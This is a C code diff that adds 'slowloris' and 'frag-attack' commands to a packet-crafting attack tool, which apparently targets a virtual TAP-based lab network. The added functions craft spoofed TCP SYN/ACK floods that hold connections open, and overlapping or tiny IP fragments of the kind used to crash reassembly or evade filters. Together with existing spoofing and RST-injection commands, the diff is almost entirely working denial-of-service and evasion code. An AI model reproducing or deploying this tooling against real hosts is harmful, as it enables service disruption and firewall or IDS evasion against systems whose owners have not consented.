@@ -15,6 +15,8 @@ static void usage(void) {
     fprintf(stderr, "  vlan-hop   --target <ip> --target-vlan <vid> [--outer-vlan <vid>] [--iface <name>] [--count <n>]\n");
     fprintf(stderr, "  rst-inject --target <ip> --port <port> --src <ip> --sport <port> [--seq <n>] [--count <n>] [--iface <name>]\n");
     fprintf(stderr, "  ip-spoof   --src <ip> --dst <ip> --port <port> [--count <n>] [--iface <name>]\n");
+    fprintf(stderr, "  slowloris  --target <ip> --port <port> [--conns <n>] [--iface <name>]\n");
+    fprintf(stderr, "  frag-attack --target <ip> [--overlap] [--tiny] [--iface <name>] [--count <n>]\n");
     fprintf(stderr, "\nAll commands require sudo (raw socket access).\n");
 }
 
@@ -315,6 +317,134 @@ static int cmd_ip_spoof(int argc, char **argv) {
     return 0;
 }
 
+static int cmd_slowloris(int argc, char **argv) {
+    const char *target_str = NULL;
+    const char *iface = "iron0";
+    uint16_t port = 8080;
+    int conns = 50;
+
+    for (int i = 0; i < argc; i++) {
+        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
+        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) port = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--conns") == 0 && i + 1 < argc) conns = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
+    }
+
+    if (!target_str) { fprintf(stderr, "Error: --target required\n"); return 1; }
+    uint32_t dst_ip = parse_ip(target_str);
+    if (!dst_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }
+
+    int fd = tap_open(iface);
+    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }
+
+    printf("=== Slowloris Attack ===\n");
+    printf("  Target:  %s:%d\n", target_str, port);
+    printf("  Conns:   %d\n", conns);
+    printf("  Iface:   %s\n\n", iface);
+
+    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x05};
+    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
+    uint32_t src_ip = htonl(0xC0A80A01);
+    uint8_t frame[256];
+    g_rand_state = (uint32_t)time(NULL);
+
+    /* Phase 1: Open connections (send SYNs) */
+    printf("  Phase 1: Opening %d connections...\n", conns);
+    for (int i = 0; i < conns; i++) {
+        uint16_t sport = 20000 + i;
+        int len = craft_tcp_syn(frame, sizeof(frame), src_mac, dst_mac,
+                                src_ip, dst_ip, sport, port, fast_rand());
+        if (len > 0) tap_write(fd, frame, len);
+        usleep(5000);
+    }
+
+    /* Phase 2: Send partial data slowly (keep connections alive) */
+    printf("  Phase 2: Sending partial headers (1 byte every 2s)...\n");
+    uint8_t partial[] = "X";
+    for (int round = 0; round < 5; round++) {
+        for (int i = 0; i < conns; i++) {
+            uint16_t sport = 20000 + i;
+            int len = craft_tcp_ack(frame, sizeof(frame), src_mac, dst_mac,
+                                    src_ip, dst_ip, sport, port,
+                                    1001 + round, 1001,
+                                    partial, 1);
+            if (len > 0) tap_write(fd, frame, len);
+        }
+        sleep(2);
+    }
+
+    printf("  Done: %d connections held open for ~10s\n\n", conns);
+    close(fd);
+    return 0;
+}
+
+static int cmd_frag_attack(int argc, char **argv) {
+    const char *target_str = NULL;
+    const char *iface = "iron0";
+    int do_overlap = 0, do_tiny = 0;
+    int count = 10;
+
+    for (int i = 0; i < argc; i++) {
+        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
+        else if (strcmp(argv[i], "--overlap") == 0) do_overlap = 1;
+        else if (strcmp(argv[i], "--tiny") == 0) do_tiny = 1;
+        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
+    }
+
+    if (!target_str) { fprintf(stderr, "Error: --target required\n"); return 1; }
+    if (!do_overlap && !do_tiny) do_overlap = 1; /* default */
+
+    uint32_t dst_ip = parse_ip(target_str);
+    if (!dst_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }
+
+    int fd = tap_open(iface);
+    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }
+
+    printf("=== Fragmentation Attack ===\n");
+    printf("  Target:  %s\n", target_str);
+    printf("  Mode:    %s%s\n", do_overlap ? "overlap " : "", do_tiny ? "tiny" : "");
+    printf("  Count:   %d\n", count);
+    printf("  Iface:   %s\n\n", iface);
+
+    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x06};
+    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
+    uint32_t src_ip = htonl(0xC0A80A01);
+    uint8_t frame[256];
+    uint8_t payload[64];
+    memset(payload, 'A', sizeof(payload));
+    int sent = 0;
+
+    for (int i = 0; i < count; i++) {
+        uint16_t id = 1000 + i;
+
+        if (do_overlap) {
+            /* Fragment 1: offset=0, 32 bytes, MF=1 */
+            int len = craft_ip_fragment(frame, sizeof(frame), src_mac, dst_mac,
+                                        src_ip, dst_ip, id, 0, 1, payload, 32);
+            if (len > 0) { tap_write(fd, frame, len); sent++; }
+
+            /* Fragment 2: offset=16 (overlaps with frag 1), 32 bytes, MF=0 */
+            len = craft_ip_fragment(frame, sizeof(frame), src_mac, dst_mac,
+                                    src_ip, dst_ip, id, 16, 0, payload, 32);
+            if (len > 0) { tap_write(fd, frame, len); sent++; }
+        }
+
+        if (do_tiny) {
+            /* Tiny fragment: 8 bytes payload (below minimum 48 for non-last) */
+            int len = craft_ip_fragment(frame, sizeof(frame), src_mac, dst_mac,
+                                        src_ip, dst_ip, id + 500, 0, 1, payload, 8);
+            if (len > 0) { tap_write(fd, frame, len); sent++; }
+        }
+
+        usleep(10000);
+    }
+
+    printf("  Sent: %d fragments\n\n", sent);
+    close(fd);
+    return 0;
+}
+
 int main(int argc, char **argv) {
     if (argc < 2) {
         usage();
@@ -333,6 +463,10 @@ int main(int argc, char **argv) {
         return cmd_rst_inject(argc - 2, argv + 2);
     } else if (strcmp(cmd, "ip-spoof") == 0) {
         return cmd_ip_spoof(argc - 2, argv + 2);
+    } else if (strcmp(cmd, "slowloris") == 0) {
+        return cmd_slowloris(argc - 2, argv + 2);
+    } else if (strcmp(cmd, "frag-attack") == 0) {
+        return cmd_frag_attack(argc - 2, argv + 2);
     } else if (strcmp(cmd, "--help") == 0 || strcmp(cmd, "-h") == 0) {
         usage();
         return 0;
